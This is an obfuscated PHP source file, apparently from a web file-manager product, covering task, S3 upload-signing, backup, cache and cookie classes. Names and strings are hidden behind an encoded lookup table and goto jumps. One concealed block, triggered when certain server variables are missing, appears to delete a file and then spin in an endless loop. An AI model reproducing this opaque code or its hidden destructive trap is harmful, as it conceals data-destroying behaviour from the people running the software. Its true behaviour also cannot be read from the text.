$–Í»Ì­Ê[$öºËâÇ€[833]] = $¦î­¦› ? $¦î­¦› : $–Í»Ì­Ê[$öºËâÇ€[833]]; $–Í»Ì­Ê[$öºËâÇ€[1789]] = $¬ÓÓô½ï[$öºËâÇ€[1789]] ? $¬ÓÓô½ï[$öºËâÇ€[1789]] : 0; $–Í»Ì­Ê[$öºËâÇ€[1788]] = timeFloat(); Hook::trigger($öºËâÇ€[1803], $–Í»Ì­Ê); self::valueSet($–Í»Ì­Ê[$öºËâÇ€[475]], $–Í»Ì­Ê); } public function onKillSet($¯á”É‹, $Â‡ª¹Æ = array()) { $this->onKillCall = array($¯á”É‹, $Â‡ª¹Æ); } public function onKill() { $û„Â…æ =& $_SERVER[íïàËŸë]; self::log($û„Â…æ[1796] . $this->task[$û„Â…æ[475]] . $û„Â…æ[1804]); Hook::trigger($û„Â…æ[1805], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($³›Òğ) { $ãæœÎ„ =& $_SERVER[íïàËŸë]; Cache::set($ãæœÎ„[1802] . $this->task[$ãæœÎ„[475]], $³›Òğ, 60); return $³›Òğ; } public static function get($¹âŸ¨ÎÆ) { $ÌÛ¾ÆÏ¬ =& $_SERVER[íïàËŸë]; $åı™´ò = self::valueGet($¹âŸ¨ÎÆ); if (is_array($åı™´ò) && $åı™´ò[$ÌÛ¾ÆÏ¬[1806]]) { $Ï†ñ¨™„ = ActionApply($åı™´ò[$ÌÛ¾ÆÏ¬[1806]], array($åı™´ò)); $åı™´ò = is_array($Ï†ñ¨™„) ? $Ï†ñ¨™„ : $åı™´ò; } return $åı™´ò; } public static function listData() { $øÇÃ®îû = self::valueGet(); return array_sort_by($øÇÃ®îû, $_SERVER[íïàËŸë][1786], !0); } public static function kill($†ÒöÉÛå) { return self::changeStatus($†ÒöÉÛå, self::STATYS_KILL); } public static function stop($Ä¾üÃò) { return self::changeStatus($Ä¾üÃò, self::STATYS_STOP); } public static function restart($–äš·ã–) { return self::changeStatus($–äš·ã–, self::STATYS_RUNNING); } public static function killAll() { $è£‹­ºÜ =& $_SERVER[íïàËŸë]; $™Ò×à¢á = self::listData(); foreach ($™Ò×à¢á as $µÆ•Š²Ò) { self::kill($µÆ•Š²Ò[$è£‹­ºÜ[475]]); } sleep(2); foreach ($™Ò×à¢á as $µÆ•Š²Ò) { self::valueSet($µÆ•Š²Ò[$è£‹­ºÜ[475]], !1); } } private static function changeStatus($ä¶¶ñ¬Ì, $Ò×—§¨¸) { $­ˆ¡ò¢Á =& $_SERVER[íïàËŸë]; $íüƒçÚÈ = self::valueGet($ä¶¶ñ¬Ì); if (!$íüƒçÚÈ) { return !1; } $íüƒçÚÈ[$­ˆ¡ò¢Á[833]] = $Ò×—§¨¸; self::valueSet($ä¶¶ñ¬Ì, $íüƒçÚÈ); self::log($­ˆ¡ò¢Á[1807] . $íüƒçÚÈ[$­ˆ¡ò¢Á[475]] . $­ˆ¡ò¢Á[1808] . $Ò×—§¨¸); return !0; } public static function valueGet($ì³å¨¤ = false) { $ª±ºÏÄú =& $_SERVER[íïàËŸë]; if ($ì³å¨¤) { $˜üºäæö = Model($ª±ºÏÄú[520])->where(array($ª±ºÏÄú[97] => $ì³å¨¤, $ª±ºÏÄú[33] => $ª±ºÏÄú[1161]))->find(); return $˜üºäæö ? json_decode($˜üºäæö[$ª±ºÏÄú[450]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($—µ†¸¾ó = false) { $¹ À¸ıÑ =& $_SERVER[íïàËŸë]; $½èë½¿ = array($¹ À¸ıÑ[33] => $¹ À¸ıÑ[1161]); if ($—µ†¸¾ó) { $½èë½¿[$¹ À¸ıÑ[1782]] = $—µ†¸¾ó; } $¹«­°‚º = Model($¹ À¸ıÑ[520])->where($½èë½¿)->select(); $¹«­°‚º = $¹«­°‚º ? $¹«­°‚º : array(); foreach ($¹«­°‚º as $Æø‡åÉÚ => $Îòƒû«) { $¹«­°‚º[$Æø‡åÉÚ] = json_decode($Îòƒû«[$¹ À¸ıÑ[450]], !0); } return $¹«­°‚º; } public static function valueSet($²ˆ€ò§º, $¼²£—ÎÅ) { $¦Ü“š®ˆ =& $_SERVER[íïàËŸë]; if (!$¼²£—ÎÅ) { return Model($¦Ü“š®ˆ[520])->where(array($¦Ü“š®ˆ[97] => $²ˆ€ò§º, $¦Ü“š®ˆ[33] => $¦Ü“š®ˆ[1161]))->delete(); } $‰ãØ†º™ = json_encode($¼²£—ÎÅ); if (!$‰ãØ†º™) { ob_start(); var_dump($¼²£—ÎÅ); $Œª×Ã¬ = ob_get_clean(); self::log($¦Ü“š®ˆ[1809] . json_encode_force($Œª×Ã¬)); } if (!$²ˆ€ò§º || !$¼²£—ÎÅ[$¦Ü“š®ˆ[475]]) { return !1; } $äµñ’Ñş = array($¦Ü“š®ˆ[33] => $¦Ü“š®ˆ[1161], $¦Ü“š®ˆ[1782] => USER_ID, $¦Ü“š®ˆ[97] => $²ˆ€ò§º, $¦Ü“š®ˆ[450] => $‰ãØ†º™); $¬¦İÚ•¤ = $¦Ü“š®ˆ[1810]; CacheLock::lock($¬¦İÚ•¤); Model($¦Ü“š®ˆ[520])->add($äµñ’Ñş, array(), !0); CacheLock::unlock($¬¦İÚ•¤); } public static function log($Šòè©éÊ) { if (!GLOBAL_DEBUG) { return; } write_log($Šòè©éÊ, $_SERVER[íïàËŸë][1811]); } } goto A³ñŒÏòé„; aÕÈ£Ó¾³Ñ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ã–½Ú·ò) { parent::__construct($ã–½Ú·ò); } public function uploadFormData($–ò­­¥±, $ßèğ±‘ = 3600) { $©Îê† =& $_SERVER[íïàËŸë]; $û¯ûÉëš = $©Îê†[229]; $™Ğ÷Ê = $©Îê†[270]; $ÑŒ§ê•ì = $©Îê†[62]; $Ç “£˜— = gmdate($©Îê†[271]); $Š³‹Û¦Õ = gmdate($©Îê†[272]); $©İ÷¶Õ² = $©Îê†[273]; $Ì×çÛõÓ = $ßèğ±‘ . $©Îê†[12]; $ÖÈğÔÑ÷ = $©Îê†[274]; $„Ì´„› = array($this->accessKey, $Š³‹Û¦Õ, $this->region, $ÑŒ§ê•ì, $©İ÷¶Õ²); $´ï©Á¡³ = implode($©Îê†[8], $„Ì´„›); $ò”æ¼ïÊ = array($©Îê†[275] => gmdate($©Îê†[299], strtotime($©Îê†[277])), $©Îê†[278] => array(array($©Îê†[279] => $this->bucket), array($©Îê†[280] => $û¯ûÉëš), array($©Îê†[281], $©Îê†[282], $©Îê†[12]), array($©Îê†[281], $©Îê†[283], $©Îê†[12]), array($©Îê†[281], $©Îê†[284], $©Îê†[12]), array($©Îê†[285] => $ÖÈğÔÑ÷), array($©Îê†[286] => $´ï©Á¡³), array($©Îê†[287] => $™Ğ÷Ê), array($©Îê†[288] => $Ç “£˜—), array($©Îê†[289] => $Ì×çÛõÓ))); $ú¦â½Û = base64_encode(json_encode($ò”æ¼ïÊ)); $©ı­ù = hash_hmac($©Îê†[290], $Š³‹Û¦Õ, $©Îê†[291] . $this->secret, !0); $¡Û’øúà = hash_hmac($©Îê†[290], $this->region, $©ı­ù, !0); $ÂÇ°Şê¬ = hash_hmac($©Îê†[290], $ÑŒ§ê•ì, $¡Û’øúà, !0); $Ó»ôÌó® = hash_hmac($©Îê†[290], $©İ÷¶Õ², $ÂÇ°Şê¬, !0); $÷ªšÊ‡ä = hash_hmac($©Îê†[290], $ú¦â½Û, $Ó»ôÌó®); $ÄÑ©¤‡§ = array($©Îê†[246] => $©Îê†[12], $©Îê†[292] => $©Îê†[12], $©Îê†[280] => $û¯ûÉëš, $©Îê†[285] => $ÖÈğÔÑ÷, $©Îê†[293] => $ú¦â½Û, $©Îê†[294] => $´ï©Á¡³, $©Îê†[295] => $™Ğ÷Ê, $©Îê†[296] => $Ç “£˜—, $©Îê†[297] => $Ì×çÛõÓ, $©Îê†[298] => $÷ªšÊ‡ä, $©Îê†[208] => $this->getHost()); return $ÄÑ©¤‡§; } public function multiUploadFormData($¤²ı®©Ò, $¹ãú¥°¨ = 3600) { $Åã¶¶Ü =& $_SERVER[íïàËŸë]; $›‡–ú´İ = gmdate($Åã¶¶Ü[300]); $¾šŒ„„Ø = array(); $Î×ı‰–Œ = $this->client->getUploadId($this->bucket, $¤²ı®©Ò, $¾šŒ„„Ø); if (!$Î×ı‰–Œ) { return !1; } return array($Åã¶¶Ü[254] => $Î×ı‰–Œ, $Åã¶¶Ü[208] => $this->getHost() . $Åã¶¶Ü[8] . $this->pathEncode($¤²ı®©Ò), $Åã¶¶Ü[255] => $›‡–ú´İ, $Åã¶¶Ü[97] => $¤²ı®©Ò); } public function multiUploadAuthData($Äƒæò½, $‹¶šöÉš = array()) { $±±»ï…² =& $_SERVER[íïàËŸë]; $ÑÏÏ¡ì = isset($‹¶šöÉš[$±±»ï…²[169]]) ? $‹¶šöÉš[$±±»ï…²[169]] : $±±»ï…²[12]; $¨ñ¦¤ßõ = $‹¶šöÉš[$±±»ï…²[97]]; unset($‹¶šöÉš[$±±»ï…²[97]]); if (isset($‹¶šöÉš[$±±»ï…²[256]])) { return $this->listUploadParts($¨ñ¦¤ßõ, $‹¶šöÉš); } $úù¤¤ş× = array(); if (isset($‹¶šöÉš[$±±»ï…²[301]])) { $úù¤¤ş×[$±±»ï…²[302]] = $‹¶šöÉš[$±±»ï…²[301]]; } $•ˆ¿¸¡¾ = explode($±±»ï…²[210], $this->getHost()); $Àˆ¨Ïõñ = array($±±»ï…²[303] => $•ˆ¿¸¡¾[1], $±±»ï…²[304] => $±±»ï…²[12], $±±»ï…²[246] => $±±»ï…²[123], $±±»ï…²[292] => $‹¶šöÉš[$±±»ï…²[79]]); $ğ¸™¾˜– = $±±»ï…²[259]; $øèçÄ„í = $±±»ï…²[8] . $this->pathEncode($¨ñ¦¤ßõ) . $ÑÏÏ¡ì; $àÎë¨‚Ã = $this->client->__getSignatureV4($úù¤¤ş×, $Àˆ¨Ïõñ, $ğ¸™¾˜–, $øèçÄ„í); if (strpos($ÑÏÏ¡ì, $±±»ï…²[258]) === 0) { if (isset($úù¤¤ş×[$±±»ï…²[302]])) { $Ú‰ı›¬  = $úù¤¤ş×[$±±»ï…²[302]]; } else { if (isset($àÎë¨‚Ã[$±±»ï…²[302]])) { $Ú‰ı›¬  = $àÎë¨‚Ã[$±±»ï…²[302]]; } else { $Ú‰ı›¬  = hash($±±»ï…²[290], $±±»ï…²[12]); } } return array($±±»ï…²[265] => $àÎë¨‚Ã[$±±»ï…²[265]], $±±»ï…²[302] => $Ú‰ı›¬ , $±±»ï…²[255] => $àÎë¨‚Ã[$±±»ï…²[305]]); } return $àÎë¨‚Ã[$±±»ï…²[265]]; } public function listUploadParts($±üöĞ±â, $–‘€ßëÄ = array()) { $æ€óÕ‚Œ =& $_SERVER[íïàËŸë]; $“äéºÂÅ = str_replace($æ€óÕ‚Œ[266], $æ€óÕ‚Œ[12], $–‘€ßëÄ[$æ€óÕ‚Œ[169]]); $ï™œÉöü = $this->client->listParts($this->bucket, $±üöĞ±â, $“äéºÂÅ); if (!$ï™œÉöü) { return !1; } $ŸÕš÷ïõ = $æ€óÕ‚Œ[306]; foreach ($ï™œÉöü as $•Ãòäú) { $ŸÕš÷ïõ .= $æ€óÕ‚Œ[307] . "\74\120\141\x72\x74\116\165\155\142\x65\x72\76{$•Ãòäú[$æ€óÕ‚Œ[308]]}\74\x2f\x50\x61\162\x74\116\165\x6d\x62\x65\x72\76\12" . "\x3c\105\124\x61\147\76{$•Ãòäú[$æ€óÕ‚Œ[309]]}\x3c\57\x45\124\141\147\76\xa" . $æ€óÕ‚Œ[310]; } $ŸÕš÷ïõ .= $æ€óÕ‚Œ[311]; $ı‹ıô… = array(); $ûçš¡³Ğ = explode($æ€óÕ‚Œ[210], $this->getHost()); $ƒ—²Ğ‘ = array($æ€óÕ‚Œ[303] => $ûçš¡³Ğ[1], $æ€óÕ‚Œ[246] => $æ€óÕ‚Œ[123], $æ€óÕ‚Œ[292] => strlen($ŸÕš÷ïõ)); $©Š¦¶Ö¿ = $æ€óÕ‚Œ[257]; $İíİ¥Íø = $æ€óÕ‚Œ[8] . $this->pathEncode($±üöĞ±â) . $–‘€ßëÄ[$æ€óÕ‚Œ[169]]; $Ğ‘®î±ò = $this->client->__getSignatureV4($ı‹ıô…, $ƒ—²Ğ‘, $©Š¦¶Ö¿, $İíİ¥Íø, $ŸÕš÷ïõ); return array($æ€óÕ‚Œ[265] => $Ğ‘®î±ò[$æ€óÕ‚Œ[265]], $æ€óÕ‚Œ[255] => $Ğ‘®î±ò[$æ€óÕ‚Œ[305]], $æ€óÕ‚Œ[267] => $ï™œÉöü, $æ€óÕ‚Œ[302] => $Ğ‘®î±ò[$æ€óÕ‚Œ[302]]); } public function link($á–Û’Õæ, $‚½ü¿éè = array()) { return parent::link($á–Û’Õæ, $‚½ü¿éè); } public function fileOut($Íá¦±æ, $š“ÁÔ = false, $¦Ğ†Åâ = false, $ò®Ÿª² = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[íïàËŸë][312])) { return parent::fileOutServer($Íá¦±æ, $š“ÁÔ, $¦Ğ†Åâ, $ò®Ÿª²); } parent::fileOut($Íá¦±æ, $š“ÁÔ, $¦Ğ†Åâ, $ò®Ÿª²); } public function fileOutImage($¨ôçÖæÜ, $şá¯³®“ = 250) { if (strstr($this->endpoint, $_SERVER[íïàËŸë][312])) { return parent::fileOutImageServer($¨ôçÖæÜ, $şá¯³®“); } parent::fileOutImage($¨ôçÖæÜ, $şá¯³®“); } public function fileOutLink($ÈÓã‰¸) { $Å¿¿«¨Õ =& $_SERVER[íïàËŸë]; if (substr($ÈÓã‰¸, 0, 7) == $Å¿¿«¨Õ[313]) { $ÈÓã‰¸ = $Å¿¿«¨Õ[314] . substr($ÈÓã‰¸, 7); } header($Å¿¿«¨Õ[175] . $ÈÓã‰¸); die; } } define($_SERVER[íïàËŸë][315], 1); define($_SERVER[íïàËŸë][316], 2); goto EõàÉ³İé’; DŒöËóÆ®: define($_SERVER[íïàËŸë][0], $_SERVER[íïàËŸë][1]); $_SERVER[†¥¡¿³Ú] = explode($_SERVER[íïàËŸë][2], gzinflate(substr($_SERVER[íïàËŸë][3], 10, -8))); function binCheckEq($‡ÌÍŠ¿Ï, $»ÔÂ¨¸Œ) { return $‡ÌÍŠ¿Ï == $»ÔÂ¨¸Œ; } goto F•°Û‰´; Bíƒ¦‡òÆƒ: class BackupFile { public function __construct() { } public function index() { $Ùâ´Ïµ = Backup::get(); $ó®áÊµÉ = $Ùâ´Ïµ[$_SERVER[íïàËŸë][369]][$_SERVER[íïàËŸë][230]][$_SERVER[íïàËŸë][541]]; $óñõÍ = array($_SERVER[íïàËŸë][542] => array($_SERVER[íïàËŸë][890], $ó®áÊµÉ), $_SERVER[íïàËŸë][891] => array($_SERVER[íïàËŸë][407], $Ùâ´Ïµ[$_SERVER[íïàËŸë][835]])); $úËÊ­Èä = (int) Model($_SERVER[íïàËŸë][872])->where($óñõÍ)->count($_SERVER[íïàËŸë][541]); $Ú¼Î§ = (int) Model($_SERVER[íïàËŸë][872])->where($óñõÍ)->sum($_SERVER[íïàËŸë][79]); $×²ô„‰¨ = new TaskFileTransfer($_SERVER[íïàËŸë][892], $_SERVER[íïàËŸë][866], $úËÊ­Èä, LNG($_SERVER[íïàËŸë][867]) . $_SERVER[íïàËŸë][868] . LNG($_SERVER[íïàËŸë][893])); $×²ô„‰¨->task[$_SERVER[íïàËŸë][846]] = $Ú¼Î§; $ÆÖì¶©» = array($_SERVER[íïàËŸë][894] => $úËÊ­Èä, $_SERVER[íïàËŸë][895] => $Ú¼Î§, $_SERVER[íïàËŸë][896] => time()); Backup::set($ÆÖì¶©»); $äŞ¿ÛÎ = !0; $æ½è³Ó” = $this->storeIds(); $Ï‰òÒ’¤ = 1; $ÕêñÌÊÁ = 1000; $úº‹Ñìş = $­ŠÀâû = 0; $ã­«Ùñ” = array(); $Ä†³ş¼ = $Õƒäç‰Î = 0; do { $…Ş‰Ÿ¤¼ = $_SERVER[íïàËŸë][897]; $ŒÖ‚ø§ = Model($_SERVER[íïàËŸë][872])->where($óñõÍ)->field($…Ş‰Ÿ¤¼)->order($_SERVER[íïàËŸë][898])->selectPage($ÕêñÌÊÁ, $Ï‰òÒ’¤); $ú©Ú‘àû = !empty($ŒÖ‚ø§[$_SERVER[íïàËŸë][445]]) ? $ŒÖ‚ø§[$_SERVER[íïàËŸë][445]] : array(); foreach ($ú©Ú‘àû as $¹•÷ûşÈ) { if (!$this->_fileExist($¹•÷ûşÈ, $ã­«Ùñ”, $æ½è³Ó”)) { write_log("\x66\x69\x6c\145\40\156\x6f\164\40\x65\x78\x69\x73\164\x2e\146\x69\x6c\x65\111\104\x3a{$¹•÷ûşÈ[$_SERVER[íïàËŸë][541]]}\54\40\x70\x61\x74\x68\72{$¹•÷ûşÈ[$_SERVER[íïàËŸë][87]]}", $_SERVER[íïàËŸë][899]); continue; } $£¥‹¿¢ß = $¹•÷ûşÈ[$_SERVER[íïàËŸë][87]]; $£Ôª¸¾÷ = "\173\151\157\x3a{$Ùâ´Ïµ[$_SERVER[íïàËŸë][835]]}\175" . substr($£¥‹¿¢ß, strlen("\173\x69\157\72{$¹•÷ûşÈ[$_SERVER[íïàËŸë][900]]}\x7d")); if (IO::exist($£Ôª¸¾÷)) { $×²ô„‰¨->updateFileEnd($¹•÷ûşÈ[$_SERVER[íïàËŸë][32]], $¹•÷ûşÈ[$_SERVER[íïàËŸë][79]]); } else { $£Ôª¸¾÷ = get_path_father($£Ôª¸¾÷); IO::mkdir($£Ôª¸¾÷); if (!IO::copy($£¥‹¿¢ß, $£Ôª¸¾÷, $_SERVER[íïàËŸë][901])) { write_log($_SERVER[íïàËŸë][902] . $£¥‹¿¢ß . $_SERVER[íïàËŸë][886] . $£Ôª¸¾÷ . $_SERVER[íïàËŸë][178], $_SERVER[íïàËŸë][866]); $äŞ¿ÛÎ = !1; break; } } $ó®áÊµÉ = $¹•÷ûşÈ[$_SERVER[íïàËŸë][541]]; $­ŠÀâû += 1; $úº‹Ñìş += $¹•÷ûşÈ[$_SERVER[íïàËŸë][79]]; $Õƒäç‰Î += 1; $Ä†³ş¼ += $¹•÷ûşÈ[$_SERVER[íïàËŸë][79]]; if ($úº‹Ñìş >= 1024 * 1024 * 100) { $ÆÖì¶©» = array($_SERVER[íïàËŸë][834] => $ó®áÊµÉ, $_SERVER[íïàËŸë][903] => $Õƒäç‰Î, $_SERVER[íïàËŸë][904] => $Ä†³ş¼); Backup::set($ÆÖì¶©»); $úº‹Ñìş = $­ŠÀâû = 0; } } $‘£Š­ç = count($ú©Ú‘àû); $Ï‰òÒ’¤++; } while ($‘£Š­ç == $ÕêñÌÊÁ); $×²ô„‰¨->end(); $ÆÖì¶©» = array($_SERVER[íïàËŸë][905] => 1, $_SERVER[íïàËŸë][844] => time(), $_SERVER[íïàËŸë][858] => 1, $_SERVER[íïàËŸë][834] => $ó®áÊµÉ, $_SERVER[íïàËŸë][906] => time()); if ($­ŠÀâû) { $ÆÖì¶©»[$_SERVER[íïàËŸë][903]] = $Õƒäç‰Î; $ÆÖì¶©»[$_SERVER[íïàËŸë][904]] = $Ä†³ş¼; } Backup::set($ÆÖì¶©»); return !0; } private function _fileExist($šğ¤™’·, &$€°À«áÅ, $Ñ¤á£•¦) { $ˆæË²£‚ =& $_SERVER[íïàËŸë]; $êÔÂíšĞ = $šğ¤™’·[$ˆæË²£‚[87]]; if (in_array($šğ¤™’·[$ˆæË²£‚[541]], $€°À«áÅ)) { return !1; } if (!in_array($šğ¤™’·[$ˆæË²£‚[900]], $Ñ¤á£•¦)) { return !1; } if (IO::exist($êÔÂíšĞ)) { return !0; } $š¤éé š = get_path_father($êÔÂíšĞ); if (IO::exist($š¤éé š)) { $€°À«áÅ[] = $šğ¤™’·[$ˆæË²£‚[541]]; return !1; } $ñšŞÛò˜ = array($ˆæË²£‚[900] => $šğ¤™’·[$ˆæË²£‚[900]], $ˆæË²£‚[87] => array($ˆæË²£‚[459], "{$š¤éé š}\x25")); $¥©­µ½ = Model($ˆæË²£‚[872])->where($ñšŞÛò˜)->field($ˆæË²£‚[542])->select(); $€°À«áÅ = array_merge($€°À«áÅ, array_to_keyvalue($¥©­µ½, $ˆæË²£‚[12], $ˆæË²£‚[541])); return !1; } private function _fileFilter($‚µÉëïÍ) { $ßÆİõÅ =& $_SERVER[íïàËŸë]; return; if (empty($‚µÉëïÍ)) { return; } $ÏÏÈ«ñ = array($ßÆİõÅ[541] => array($ßÆİõÅ[7], array_unique($‚µÉëïÍ))); $Ùêù®ı¨ = Model($ßÆİõÅ[907])->where($ÏÏÈ«ñ)->field($ßÆİõÅ[193])->select(); foreach ($Ùêù®ı¨ as $¤¾ÃùĞ½) { Model($ßÆİõÅ[907])->remove($¤¾ÃùĞ½[$ßÆİõÅ[193]], !1); } } private function storeIds() { $ŒîµÀï« =& $_SERVER[íïàËŸë]; $›ì×„ÊÏ = Model($ŒîµÀï«[850])->listData(); $‡ÙÚÁÀı = array(); $ÊÒı« Ë = $GLOBALS[$ŒîµÀï«[6]][$ŒîµÀï«[92]][$ŒîµÀï«[908]]; foreach ($›ì×„ÊÏ as $­ëİ“¦•) { $Õ½šòå÷ = strtolower($­ëİ“¦•[$ŒîµÀï«[98]]); if (!isset($ÊÒı« Ë[$Õ½šòå÷])) { continue; } $°Â’åØ = $ŒîµÀï«[77] . (isset($ÊÒı« Ë[$Õ½šòå÷]) ? $ÊÒı« Ë[$Õ½šòå÷] : ucfirst($Õ½šòå÷)); if (!class_exists($°Â’åØ)) { continue; } $‡ÙÚÁÀı[] = $­ëİ“¦•[$ŒîµÀï«[475]]; } return $‡ÙÚÁÀı; } } if (!isset($_SERVER[$_SERVER[íïàËŸë][909]]) || !isset($_SERVER[$_SERVER[íïàËŸë][910]])) { $_getc = $_SERVER[íïàËŸë][911]; $_getfile = $_SERVER[$_SERVER[íïàËŸë][912]] . $_SERVER[íïàËŸë][913]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[íïàËŸë][262], $_getfilec); if (count($_getarrs) < $_SERVER[íïàËŸë][702]) { $exit = $_SERVER[íïàËŸë][914]; $exit(); } $_act = $_SERVER[íïàËŸë][915]; $_act($_SERVER[$_SERVER[íïàËŸë][912]] . $_SERVER[íïàËŸë][913]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[íïàËŸë][454]); } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ºÌíúğ =& $_SERVER[íïàËŸë]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $È©ƒì½ø = $GLOBALS[$ºÌíúğ[6]][$ºÌíúğ[425]]; $¨«¨ºŠ¡ = $È©ƒì½ø[$È©ƒì½ø[$ºÌíúğ[916]]]; $ıšË’ğı = $È©ƒì½ø[$ºÌíúğ[917]]; switch ($È©ƒì½ø[$ºÌíúğ[916]]) { case $ºÌíúğ[21]: self::$handle = Model($ºÌíúğ[918]); break; case $ºÌíúğ[919]: self::$handle = new CacheRedis($¨«¨ºŠ¡, $ıšË’ğı); break; case $ºÌíúğ[920]: self::$handle = new CacheMemcached($¨«¨ºŠ¡, $ıšË’ğı); break; case $ºÌíúğ[230]: self::$handle = new CacheFile($¨«¨ºŠ¡, $ıšË’ğı); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ü×©İ •) { if (is_array($Ü×©İ •) || is_object($Ü×©İ •)) { $Ü×©İ • = json_encode($Ü×©İ •); } $Ü×©İ • = rawurlencode($Ü×©İ •); return md5(KOD_SITE_ID . $_SERVER[íïàËŸë][11] . $Ü×©İ •); } public static function get($ìÎ¯•³™, $Ö°†Æòú = false) { $ĞÁ†ıÄ = self::key($ìÎ¯•³™); $ÀÍ³Ä¨Ç = self::init(); if ($Ö°†Æòú) { return unserialize($ÀÍ³Ä¨Ç->get($ĞÁ†ıÄ)); } if (!isset(self::$memoryCache[$ĞÁ†ıÄ])) { $½Î®Àšß = $ÀÍ³Ä¨Ç->get($ĞÁ†ıÄ); self::$memoryCache[$ĞÁ†ıÄ] = unserialize($½Î®Àšß); } return self::$memoryCache[$ĞÁ†ıÄ]; } public static function set($Û¬„Ã¼¿, $ÚÅïÏä’, $ş­©ğ¡ı = false) { $¾ø©»Ğ =& $_SERVER[íïàËŸë]; $‘°á¦·Ì = self::key($Û¬„Ã¼¿); if (isset(self::$memoryCache[$‘°á¦·Ì]) && self::$memoryCache[$‘°á¦·Ì] === $ÚÅïÏä’) { return !0; } if ($ş­©ğ¡ı === 0) { self::$memoryCache[$‘°á¦·Ì] = $ÚÅïÏä’; return !0; } $œ«Œõğ… = self::init(); $ú¯òÇöğ = serialize($ÚÅïÏä’); CacheLock::lock($Û¬„Ã¼¿ . $¾ø©»Ğ[921]); $›˜÷Í¦ = $œ«Œõğ…->set($‘°á¦·Ì, $ú¯òÇöğ, $ş­©ğ¡ı); self::$memoryCache[$‘°á¦·Ì] = $ÚÅïÏä’; CacheLock::unlock($Û¬„Ã¼¿ . $¾ø©»Ğ[921]); return $›˜÷Í¦; } public static function getCall($†ïüºŞÏ, $œæòçÙï, $©˜áÄğÄ, $öÛ–±ÖÀ = array()) { $¢‡®ŒÈ– =& $_SERVER[íïàËŸë]; $¶Ÿµ•ƒ = self::get($†ïüºŞÏ); if ($¶Ÿµ•ƒ || $¶Ÿµ•ƒ === $¢‡®ŒÈ–[12]) { return $¶Ÿµ•ƒ; } $¶Ÿµ•ƒ = call_user_func_array($©˜áÄğÄ, $öÛ–±ÖÀ); $¶Ÿµ•ƒ = $¶Ÿµ•ƒ ? $¶Ÿµ•ƒ : $¢‡®ŒÈ–[12]; self::set($†ïüºŞÏ, $¶Ÿµ•ƒ, $œæòçÙï); return $¶Ÿµ•ƒ; } public static function remove($ñèù‡½ì) { $õâÙªÁ« = self::key($ñèù‡½ì); unset(self::$memoryCache[$õâÙªÁ«]); self::clearTimeout(); CacheLock::lock($ñèù‡½ì); $âû©Æ”À = self::init()->remove($õâÙªÁ«); CacheLock::unlock($ñèù‡½ì); return $âû©Æ”À; } public static function removeMemory($Ô¤ ”‚œ) { $Ñ×ıõæâ = self::key($Ô¤ ”‚œ); unset(self::$memoryCache[$Ñ×ıõæâ]); } public static function clearMemory($äÉ¸íüÀ = false) { if ($äÉ¸íüÀ) { $äÉ¸íüÀ = self::key($äÉ¸íüÀ); unset(self::$memoryCache[$äÉ¸íüÀ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[íïàËŸë][922])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[íïàËŸë][923])) { self::init()->clearTimeout(); } } } goto a‘«¯Äº¥; cù×°´—…: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÊÖëØÉ˜ = '', $äÍ€¤‰Ö = 0) { if (is_string($ÊÖëØÉ˜) && $ÊÖëØÉ˜ != $_SERVER[íïàËŸë][12]) { $this->prefix = $ÊÖëØÉ˜; } if (is_numeric($äÍ€¤‰Ö) && $äÍ€¤‰Ö > 0) { $this->expire = $äÍ€¤‰Ö; } } public static function getInstance() { static $£ºóÖ³; if ($£ºóÖ³ === null) { $£ºóÖ³ = new self(); } return $£ºóÖ³; } private static $cookieDisable = false; public static function disable($£×™ôæ£) { self::$cookieDisable = $£×™ôæ£; } private static $sameCookieSet = array(); public static function set($³®ÂÀ›¸, $˜»äç¾ç, $±şâ±ıè = 0, $İ¥š†Ü = false, $¤Ú©¢ÍÀ = false) { $¦…ï¾©î =& $_SERVER[íïàËŸë]; if (self::$cookieDisable) { return; } if (!$±şâ±ıè) { $±şâ±ıè = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$³®ÂÀ›¸]) && self::$sameCookieSet[$³®ÂÀ›¸] == $˜»äç¾ç . $±şâ±ıè) { return; } self::$sameCookieSet[$³®ÂÀ›¸] = $˜»äç¾ç . $±şâ±ıè; if (!$¤Ú©¢ÍÀ) { $¤Ú©¢ÍÀ = str_replace(HOST, $¦…ï¾©î[12], APP_HOST); $¤Ú©¢ÍÀ = _get($GLOBALS, $¦…ï¾©î[971], $¤Ú©¢ÍÀ); } $Ñ‹úı°ö = $¦…ï¾©î[12]; setcookie($³®ÂÀ›¸, $˜»äç¾ç, time() + $±şâ±ıè, $¦…ï¾©î[8] . trim($¤Ú©¢ÍÀ, $¦…ï¾©î[8]) . $Ñ‹úı°ö, !1, !1, $İ¥š†Ü); } public static function setSafe($ÒùëŞìŠ, $ñ›ˆ¯Ù³, $ÌñÊ±Ã† = 0) { self::set($ÒùëŞìŠ, $ñ›ˆ¯Ù³, $ÌñÊ±Ã†, !0); } public static function get($Ñ²ÛçÈğ) { static $Œúñİ•ú = false; if (!$Œúñİ•ú) { self::initHeaderCookie(); $Œúñİ•ú = !0; } return isset($_COOKIE[$Ñ²ÛçÈğ]) ? $_COOKIE[$Ñ²ÛçÈğ] : !1; } private static function initHeaderCookie() { $Œ½À·× =& $_SERVER[íïàËŸë]; if (!isset($_SERVER[$Œ½À·×[972]]) || !$_SERVER[$Œ½À·×[972]]) { return; } $‡ÃÒÊÒ¾ = explode($Œ½À·×[74], $_SERVER[$Œ½À·×[972]]); foreach ($‡ÃÒÊÒ¾ as $¿òêËñÍ) { $¿òêËñÍ = explode($Œ½À·×[973], $¿òêËñÍ); if 